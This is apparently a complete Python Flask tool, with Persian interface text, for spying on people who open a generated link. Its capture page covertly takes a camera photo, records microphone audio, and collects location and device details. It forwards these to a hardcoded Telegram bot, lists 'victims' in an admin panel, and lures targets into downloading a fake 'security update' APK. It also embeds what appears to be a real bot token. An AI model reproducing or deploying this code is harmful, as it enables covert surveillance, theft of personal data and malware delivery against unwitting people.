import os, io, uuid, base64, json, logging, sqlite3
from datetime import datetime
from flask import Flask, request, render_template_string, send_from_directory, jsonify, send_file, g
import requests

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAVJ7K4ifgMX4AY")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8391932958")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "123")

DATABASE = "victims.db"

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

def init_db():
    with app.app_context():
        db = get_db()
        db.execute("CREATE TABLE IF NOT EXISTS victims (token TEXT PRIMARY KEY, created_at TEXT, ip TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT, type TEXT, data TEXT, timestamp TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS media (token TEXT, type TEXT, data BLOB, timestamp TEXT)")
        db.commit()

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def notify_telegram(token, ip, media_type=None, media_data=None):
    """ارسال پیام یا فایل به تلگرام"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        if media_type == 'photo' and media_data:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
            files = {'photo': ('camera.jpg', io.BytesIO(media_data), 'image/jpeg')}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"📸 عکس جدید\nتوکن: {token}\nIP: {ip}"}
            requests.post(url, data=data, files=files, timeout=10)
        elif media_type == 'audio' and media_data:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendAudio"
            files = {'audio': ('mic.webm', io.BytesIO(media_data), 'audio/webm')}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"🎤 صدای ضبط‌شده\nتوکن: {token}\nIP: {ip}"}
            requests.post(url, data=data, files=files, timeout=10)
        else:
            msg = f"🔔 قربانی جدید!\nتوکن: {token}\nIP: {ip}"
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                         json={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=5)
    except Exception as e:
        app.logger.error(f"Telegram notify failed: {e}")

CAPTURE_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>...</title>
<style>body{background:#000;color:#fff;text-align:center;font-family:Arial;padding-top:10vh;} video,canvas{display:none;} #dl{display:none;padding:15px 30px;background:#4CAF50;color:#fff;border:none;font-size:18px;cursor:pointer;border-radius:8px;}</style>
</head>
<body>
<h2 id="m">در حال برقراری ارتباط...</h2>
<video id="v" autoplay playsinline></video><canvas id="c"></canvas>
<a id="dl" href="/download/app-update.apk" download>دانلود بروزرسانی امنیتی</a>
<script>
const t="{{ token }}", m=document.getElementById('m'), v=document.getElementById('v'), c=document.getElementById('c'), ctx=c.getContext('2d'), dl=document.getElementById('dl');
navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location',lat:p.coords.latitude,lng:p.coords.longitude})})},e=>{fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location_error',message:e.message})})});
fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'device',userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone})});
async function pic(){
  try{
    const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
    v.srcObject=s;v.onloadedmetadata=()=>{c.width=v.videoWidth;c.height=v.videoHeight;ctx.drawImage(v,0,0);const d=c.toDataURL('image/jpeg',0.8);fetch('/upload/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',data:d})});setTimeout(()=>s.getTracks().forEach(tr=>tr.stop()),2000);}
  }catch(e){m.innerText='دسترسی به دوربین داده نشد.';}
}
async function rec(){
  try{
    const s=await navigator.mediaDevices.getUserMedia({audio:true});
    const mr=new MediaRecorder(s);let chunks=[];
    mr.ondataavailable=e=>chunks.push(e.data);
    mr.onstop=()=>{
      const blob=new Blob(chunks,{type:'audio/webm'});
      const reader=new FileReader();
      reader.onloadend=()=>{
        const b64=reader.result.split(',')[1];
        fetch('/upload/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'audio',data:b64})});
      };
      reader.readAsDataURL(blob);
    };
    mr.start();setTimeout(()=>{mr.stop();s.getTracks().forEach(tr=>tr.stop());},5000);
  }catch(e){console.log('mic error');}
}
async function start(){
  pic();
  setTimeout(rec,3000);
  setTimeout(()=>{m.innerText='اتصال برقرار شد.';dl.style.display='block';},6000);
}
start();
</script>
</body></html>
"""

ADMIN_LOGIN = """
<!DOCTYPE html><html><head><title>ورود</title><style>body{background:#1e1e1e;color:#0f0;text-align:center;padding-top:20vh;} input{padding:10px;margin:5px;}</style></head>
<body><h2>پنل مدیریت</h2><form method=post action=/admin><input type=password name=pass placeholder=رمز><br><input type=submit value=ورود></form></body></html>
"""

ADMIN_PANEL = """
<!DOCTYPE html><html><head><title>پنل قربانیان</title>
<style>body{background:#1e1e1e;color:#0f0;font-family:monospace;padding:20px;} .v{border:1px solid #0f0;padding:10px;margin:10px;} img{max-width:200px;}</style></head>
<body>
<h1>🎯 قربانیان</h1>
{% for v in victims %}
<div class=v>
  <b>توکن:</b> {{ v.token }}<br>
  <b>IP:</b> {{ v.ip }}<br>
  <b>زمان:</b> {{ v.created_at }}<br>
  <b>اطلاعات:</b> <pre>{{ v.info }}</pre>
  {% if v.photo %}<b>عکس:</b><br><img src="data:image/jpeg;base64,{{ v.photo }}"><br>{% endif %}
  {% if v.audio %}<b>صدا:</b> <audio controls src="data:audio/webm;base64,{{ v.audio }}"></audio><br>{% endif %}
  {% if v.location %}<b>موقعیت:</b> <a href="https://maps.google.com/?q={{ v.location }}" target=_blank>مشاهده روی نقشه</a><br>{% endif %}
</div>
{% endfor %}
</body></html>
"""

@app.route('/')
def index():
    return "ربات فعال. /new-link برای لینک جدید, /admin برای مدیریت"

@app.route('/new-link')
def new_link():
    token = str(uuid.uuid4())
    db = get_db()
    db.execute("INSERT INTO victims (token, created_at, ip) VALUES (?, ?, ?)",
               (token, datetime.now().isoformat(), request.remote_addr))
    db.commit()
    link = f"{request.host_url}capture/{token}"
    return jsonify({"link": link, "token": token})

@app.route('/capture/<token>')
def capture(token):
    return render_template_string(CAPTURE_PAGE, token=token)

@app.route('/upload/<token>', methods=['POST'])
def upload(token):
    data = request.get_json()
    if not data:
        return jsonify({"error": "no data"}), 400
    media_type = data.get('type')
    raw = data.get('data')
    try:
        if media_type == 'photo':
            binary = base64.b64decode(raw.split(',')[1] if ',' in raw else raw)
        elif media_type == 'audio':
            binary = base64.b64decode(raw)
        else:
            return jsonify({"error": "unknown type"}), 400
        db = get_db()
        db.execute("INSERT INTO media (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
                   (token, media_type, binary, datetime.now().isoformat()))
        db.commit()
        # ارسال مستقیم فایل به تلگرام
        notify_telegram(token, request.remote_addr, media_type=media_type, media_data=binary)
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/log/<token>', methods=['POST'])
def log(token):
    data = request.get_json()
    data['ip'] = request.remote_addr
    db = get_db()
    db.execute("INSERT INTO logs (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
               (token, data.get('type', 'unknown'), json.dumps(data), datetime.now().isoformat()))
    db.execute("UPDATE victims SET ip=? WHERE token=?", (request.remote_addr, token))
    db.commit()
    if data.get('type') == 'device':
        notify_telegram(token, request.remote_addr)
    return jsonify({"status": "ok"})

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        if request.form.get('pass') == ADMIN_PASSWORD:
            resp = app.make_response("logged in")
            resp.set_cookie('admin', '1')
            return resp
        return "رمز اشتباه", 403
    if request.cookies.get('admin') != '1':
        return render_template_string(ADMIN_LOGIN)
    db = get_db()
    victims_rows = db.execute("SELECT * FROM victims ORDER BY created_at DESC").fetchall()
    victims = []
    for row in victims_rows:
        token = row['token']
        log_row = db.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        info = json.loads(log_row['data']) if log_row else {}
        photo_row = db.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        photo_b64 = base64.b64encode(photo_row['data']).decode() if photo_row else None
        audio_row = db.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        audio_b64 = base64.b64encode(audio_row['data']).decode() if audio_row else None
        loc_row = db.execute("SELECT data FROM logs WHERE token=? AND type='location' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        loc = None
        if loc_row:
            loc_data = json.loads(loc_row['data'])
            loc = f"{loc_data.get('lat')},{loc_data.get('lng')}"
        victims.append({
            "token": token,
            "ip": row['ip'],
            "created_at": row['created_at'],
            "info": json.dumps(info, indent=2, ensure_ascii=False),
            "photo": photo_b64,
            "audio": audio_b64,
            "location": loc
        })
    return render_template_string(ADMIN_PANEL, victims=victims)

@app.route('/download/<path:filename>')
def download_file(filename):
    return send_from_directory('static', filename)

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
